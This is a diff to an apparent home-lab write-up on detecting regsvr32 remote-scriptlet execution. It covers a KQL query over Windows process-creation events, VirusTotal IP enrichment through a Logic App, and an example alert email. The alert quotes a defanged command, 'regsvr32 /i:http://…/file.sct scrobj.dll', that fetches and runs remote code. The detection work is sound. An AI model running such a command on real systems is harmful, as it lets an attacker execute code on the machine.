@@ -28,17 +28,19 @@ The key was not just detecting it, but doing something meaningful with the alert
 
 The detection is based on **MITRE DS0017: Process Creation**, using Windows Event ID `1`. Because my lab uses the Microsoft Monitoring Agent (MMA), logs arrive as raw XML rather than in schema-based tables — requiring field extraction via `extract()` in KQL.
 
-Event  
-| where EventID \== 1  
-| extend raw\_xml \= tostring(EventData)  
-| extend  
-    Image \= extract(@"\<Data Name=""Image""\>(.\*?)\</Data\>", 1, raw\_xml),  
-    CommandLine \= extract(@"\<Data Name=""CommandLine""\>(.\*?)\</Data\>", 1, raw\_xml),  
-    ParentImage \= extract(@"\<Data Name=""ParentImage""\>(.\*?)\</Data\>", 1, raw\_xml),  
-    User \= extract(@"\<Data Name=""User""\>(.\*?)\</Data\>", 1, raw\_xml),  
-    IntegrityLevel \= extract(@"\<Data Name=""IntegrityLevel""\>(.\*?)\</Data\>", 1, raw\_xml)  
-| where Image endswith "regsvr32.exe"  
-      and CommandLine has "http"
+```kql 
+    Event 
+    | where EventID == 1 
+    | extend raw_xml = tostring(EventData) 
+    | extend 
+        Image = extract(@"<Data Name=""Image"">(.*?)</Data>", 1, raw_xml), 
+        CommandLine = extract(@"<Data Name=""CommandLine"">(.*?)</Data>", 1, raw_xml), 
+        ParentImage = extract(@"<Data Name=""ParentImage"">(.*?)</Data>", 1, raw_xml), 
+        User = extract(@"<Data Name=""User"">(.*?)</Data>", 1, raw_xml), 
+        IntegrityLevel = extract(@"<Data Name=""IntegrityLevel"">(.*?)</Data>", 1, raw_xml) 
+    | where Image endswith "regsvr32.exe" 
+        and CommandLine has "http" 
+```
 
 This query identifies executions of regsvr32 where the command line includes a remote payload — the exact behavior this project is designed to catch and enrich.
 
@@ -63,7 +65,7 @@ These fields are extracted to drive enrichment and downstream decisions:
 
 The enrichment step uses VirusTotal’s **IP reputation API**. The Logic App sends a **GET** request to:
 
-https://www.virustotal.com/api/v3/ip\_addresses/{ExtractedIP}
+https://www[.]virustotal.com/api/v3/ip\_addresses/{ExtractedIP}
 
 Using a personal API key and custom headers, it retrieves the full reputation object. From that JSON, the workflow parses:
 
@@ -111,7 +113,7 @@ The email format is intentionally clean and analyst-friendly.
 \- User: redteam  
 \- Image: C:\\Windows\\System32\\regsvr32.exe  
 \- Parent Image: powershell.exe  
-\- CommandLine: regsvr32 /i:http://192.168.1.80/file.sct scrobj.dll  
+\- CommandLine: regsvr32 /i:http://192[.]168[.]1[.]80/file.sct scrobj.dll  
 \- Integrity Level: High  
 \- Contacted IP: 192.168.1.80  
 \- VT Malicious Score: 3  
